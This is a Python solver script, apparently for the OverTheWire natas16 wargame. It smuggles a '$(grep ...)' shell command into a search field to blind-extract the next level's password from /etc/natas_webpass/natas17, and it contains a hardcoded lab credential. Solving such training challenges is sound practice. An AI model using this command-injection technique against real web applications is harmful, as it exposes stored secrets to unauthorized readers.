#!/usr/bin/env python3
import requests

password = list("a")
endIndex = 0
usernm = "natas16"
passwd = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

def increment(password, endIndex):
    if (password[endIndex] == "z"):
        password[endIndex] = "A"
    elif (password[endIndex] == "Z"):
        password[endIndex] = "0"
    else:
        password[endIndex] = chr(ord(password[endIndex]) + 1)


session = requests.Session()
url = "http://natas16.natas.labs.overthewire.org"

while (endIndex < 32):
    print(f"Trying: {"".join(password)}")
    res = session.post(url, data={"needle":'$(grep ^' + "".join(password) + ' /etc/natas_webpass/natas17'+')', "submit":"Search"}, auth = (usernm, passwd))
    if "African" not in res.text:
        endIndex += 1
        if (endIndex < 32):
            password.append("a")
    else:
        increment(password, endIndex)
print("Password is: ", end="")
print("".join(password))
